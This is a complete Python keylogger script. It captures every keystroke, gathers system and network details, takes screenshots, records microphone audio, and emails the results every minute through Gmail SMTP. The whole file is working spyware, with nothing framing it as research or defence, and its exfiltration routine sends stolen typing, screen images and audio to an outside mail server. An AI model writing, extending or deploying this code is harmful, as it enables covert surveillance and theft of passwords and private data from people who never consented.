import os
import platform
import socket
import threading
import smtplib
import wave
import io
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import pyscreenshot
import sounddevice as sd
from pynput import keyboard

# Read email credentials from environment variables
EMAIL_ADDRESS = os.getenv("KEYLOGGER_EMAIL")
EMAIL_PASSWORD = os.getenv("KEYLOGGER_PASSWORD")

if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
    print("Error: Please set KEYLOGGER_EMAIL and KEYLOGGER_PASSWORD environment variables.")
    exit(1)

SEND_REPORT_EVERY = 60  # seconds

class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.email = email
        self.password = password
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def append_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            self.append_log(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.append_log(" ")
            elif key == keyboard.Key.enter:
                self.append_log("\n")
            else:
                self.append_log(f" [{key.name}] ")

    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.platform()
            processor = platform.processor()
            system = platform.system()
            machine = platform.machine()
            info = (
                f"Hostname: {hostname}\n"
                f"IP Address: {ip}\n"
                f"Platform: {plat}\n"
                f"Processor: {processor}\n"
                f"System: {system}\n"
                f"Machine: {machine}\n"
            )
            return info
        except Exception as e:
            return f"Error getting system info: {e}"

    def take_screenshot(self):
        try:
            img = pyscreenshot.grab()
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            return img_byte_arr
        except Exception as e:
            print(f"Failed to take screenshot: {e}")
            return None

    def record_audio(self, duration=10):
        try:
            fs = 44100  # Sample rate
            seconds = duration
            # Check if any input devices are available
            if not sd.query_devices(kind='input'):
                print("No audio input device found, skipping audio recording.")
                return None
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            wav_io = io.BytesIO()
            with wave.open(wav_io, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            wav_io.seek(0)
            return wav_io
        except Exception as e:
            print(f"Failed to record audio: {e}")
            return None

    def send_email(self, subject, body, attachments=None):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        if attachments:
            for attachment in attachments:
                part = MIMEBase(attachment['type'], attachment['subtype'])
                part.set_payload(attachment['data'].read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={attachment["filename"]}'
                )
                msg.attach(part)

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(msg)
            print("Email sent successfully.")
        except smtplib.SMTPAuthenticationError:
            print("Failed to send email: Authentication error. Check your email and app password.")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            subject = f"Keylogger Report: {self.start_dt.strftime('%Y-%m-%d %H:%M:%S')} - {self.end_dt.strftime('%Y-%m-%d %H:%M:%S')}"
            system_info = self.get_system_info()
            body = f"System Information:\n{system_info}\n\nKeystrokes:\n{self.log}"

            attachments = []

            screenshot = self.take_screenshot()
            if screenshot:
                attachments.append({
                    'filename': 'screenshot.png',
                    'data': screenshot,
                    'type': 'image',
                    'subtype': 'png'
                })

            audio = self.record_audio(duration=10)
            if audio:
                attachments.append({
                    'filename': 'audio.wav',
                    'data': audio,
                    'type': 'audio',
                    'subtype': 'wav'
                })

            self.send_email(subject, body, attachments)

            self.start_dt = datetime.now()
            self.log = ""

        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.start()